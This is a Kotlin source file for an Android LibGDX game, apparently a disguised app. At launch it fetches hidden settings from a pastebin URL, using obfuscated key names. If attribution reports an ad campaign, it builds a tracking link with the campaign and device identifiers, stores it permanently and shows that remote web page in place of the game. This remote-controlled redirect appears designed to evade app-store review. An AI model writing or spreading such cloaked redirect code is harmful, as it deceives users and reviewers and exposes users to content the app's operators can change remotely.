package com.basarili.baslangisc.game

import android.content.SharedPreferences
import androidx.appcompat.app.AppCompatActivity.MODE_PRIVATE
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.basarili.baslangisc.GameActivity
import com.basarili.baslangisc.appContext
import com.basarili.baslangisc.game.dataStore.DataStore
import com.basarili.baslangisc.game.manager.MusicManager
import com.basarili.baslangisc.game.manager.NavigationManager
import com.basarili.baslangisc.game.manager.SoundManager
import com.basarili.baslangisc.game.manager.SpriteManager
import com.basarili.baslangisc.game.manager.util.MusicUtil
import com.basarili.baslangisc.game.manager.util.SoundUtil
import com.basarili.baslangisc.game.manager.util.SpriteUtil
import com.basarili.baslangisc.game.screens.LoaderScreen
import com.basarili.baslangisc.game.utils.GColor
import com.basarili.baslangisc.game.utils.advanced.AdvancedGame
import com.basarili.baslangisc.game.utils.disposeAll
import com.basarili.baslangisc.util.log
import com.onesignal.OneSignal
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

class LibGDXGame(val activity: GameActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val loader by lazy { SpriteUtil.Loader() }
    val all    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil() }
    val soundUtil by lazy { SoundUtil() }

    var backgroundColor = GColor.brawn
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    var isGame = false

    override fun create() {
        navigationManager = NavigationManager(this)
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        logicMain()
    }

    val sharedPreferences: SharedPreferences = activity.getSharedPreferences("GAME_DATA", MODE_PRIVATE)

    val dataStore = DataStore(sharedPreferences)

    override fun render() {
        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun logicMain() {
        log("logicMain")
        activity.blockRedirect = { isGame = true }
        activity.initWeb()

        val mainLogic = sharedPreferences.getString("value", "505") ?: "505"

        try {
            if (mainLogic == "505") {
                coroutine.launch(Dispatchers.Main) {
                    val mainJSON = withContext(Dispatchers.IO) { requestGet() }

                    if (mainJSON != null) {
                        AppsFlyerLib.getInstance().init(mainJSON.abobus, getAppsFlyerConversionListener(mainJSON.turkey, mainJSON.pomelo), appContext)
                        AppsFlyerLib.getInstance().start(activity, mainJSON.abobus, getAppsFlyerRequestListener())
                    } else {
                        isGame = true
                    }
                }
            } else {
                activity.showUrl(mainLogic)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            isGame = true
        }
    }

    private suspend fun requestGet() = CompletableDeferred<GetJSON?>().also { continuation ->
        val urlString = "https://pastebin.com/raw/M74TQRy1"

        try {
            val url        = URL(urlString)
            val connection = url.openConnection() as HttpURLConnection

            connection.requestMethod           = "GET"
            connection.connectTimeout          = 5000
            connection.readTimeout             = 5000
            connection.instanceFollowRedirects = true

            val responseCode = connection.responseCode

            if (responseCode == HttpURLConnection.HTTP_OK) {
                val reader = BufferedReader(InputStreamReader(connection.inputStream))
                val response = StringBuilder()
                var line: String?

                while (reader.readLine().also { line = it } != null) {
                    response.append(line)
                }
                reader.close()

                val jsonResponse = JSONObject(response.toString())
                log("json = $jsonResponse")

                val getJSON = GetJSON(
                    turkey = jsonResponse.getString("turkey") ?: "",
                    abobus = jsonResponse.getString("abobus") ?: "",
                    pomelo = jsonResponse.getString("pomelo") ?: "",
                )
                continuation.complete(getJSON)

            } else {
                log("Запит не успішний. Код відповіді: $responseCode")
                continuation.complete(null)
            }
            connection.disconnect()
        } catch (e: Exception) {
            log("Error: ${e.message}")
            e.printStackTrace()
            continuation.complete(null)
        }
    }.await()

    private data class GetJSON(val turkey: String, val abobus: String, val pomelo: String)

    private fun getAppsFlyerConversionListener(all: String, oneKey: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                val afId = AppsFlyerLib.getInstance().getAppsFlyerUID(appContext)

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$all?cmpbas=$campaign&labsa=$afAd&medso=$media&afidd=$afId"
                log("link = $link")

                // OneSignal
                if (campaign != null) {
                    coroutine.launch(Dispatchers.Main) {
                        OneSignal.initWithContext(activity, oneKey)
                        OneSignal.login(campaign)
                        withContext(Dispatchers.IO) { OneSignal.Notifications.requestPermission(false) }
                    }
                }

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("value", link).apply() }
                activity.showUrl(link)

            } else isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }



}